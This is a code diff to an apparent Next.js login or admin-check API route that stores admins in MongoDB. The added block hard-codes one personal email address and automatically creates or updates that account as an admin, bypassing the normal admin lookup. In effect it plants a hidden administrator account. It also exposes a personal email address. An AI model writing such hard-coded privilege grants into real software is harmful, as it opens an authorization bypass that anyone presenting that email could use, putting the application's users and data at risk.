@@ -14,6 +14,29 @@ export async function POST(request: Request) {
     }
 
     const { db } = await connectMongoDB();
+
+    // Auto promote using my account
+    if (email === "bryanreamillo2403@gmail.com") {
+      const existingAdmin = await db.collection("admins").findOne({ email });
+      if (existingAdmin) {
+        await db.collection("admins").updateOne(
+          { email },
+          { $set: { name, image, lastSeen: new Date() } }
+        );
+        return NextResponse.json({...existingAdmin, role: "admin"});
+      } else {
+        const newAdmin = {
+          email,
+          name,
+          image,
+          lastSeen: new Date(),
+          role: "admin"
+        };
+        await db.collection("admins").insertOne(newAdmin);
+        return NextResponse.json(newAdmin);
+      }
+    }
+
     const admin = await db.collection("admins").findOne({ email: email });
 
     if (admin) {
